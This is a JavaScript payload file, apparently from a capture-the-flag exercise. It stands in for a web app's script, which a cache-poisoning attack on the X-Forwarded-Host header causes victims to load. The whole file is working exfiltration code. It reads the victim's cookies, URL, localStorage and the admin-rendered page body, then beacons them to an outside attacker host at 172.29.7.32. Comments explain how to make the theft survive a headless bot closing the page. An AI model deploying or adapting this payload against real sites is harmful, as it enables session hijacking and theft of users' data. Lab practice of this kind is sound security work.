// Malicious replacement for the app's confettis_manager.js.
// Served from our WireGuard tunnel IP; loaded because the cached page's
// <script src> origin was poisoned via the unkeyed X-Forwarded-Host header.
//
// NOTE: exfil URLs must be ABSOLUTE. A relative "/x?..." resolves against the
// *document* origin (the challenge app), not this script's origin -- that was
// the bug in the previous version, which silently beaconed to the target.
(function () {
  var C = "http://172.29.7.32:8888";

  var out = function (tag, data) {
    // Image beacon: no CORS preflight, no response needed.
    new Image().src = C + "/x?" + tag + "=" + encodeURIComponent(data) + "&r=" + Math.random();
    // Sync XHR as a backup: blocks until the request is on the wire, so it
    // survives the headless bot tearing the page down mid-flight.
    try {
      var x = new XMLHttpRequest();
      x.open("GET", C + "/s?" + tag + "=" + encodeURIComponent(data), false);
      x.send();
    } catch (e) {}
  };

  out("hello", "js-executed");
  try { out("cookie", document.cookie); } catch (e) { out("err", "cookie:" + e); }
  try { out("url", location.href); } catch (e) {}
  try { out("ls", JSON.stringify(localStorage)); } catch (e) {}

  // Same-origin read of the app root, in case the flag renders for the admin
  // rather than living in a cookie (HttpOnly would hide it from the above).
  try {
    var r = new XMLHttpRequest();
    r.open("GET", "/", false);
    r.withCredentials = true;
    r.send();
    var m = r.responseText.match(/RM\{[^}]+\}/);
    out("body", m ? m[0] : r.responseText.slice(0, 1500));
  } catch (e) { out("err", "root:" + e); }
})();
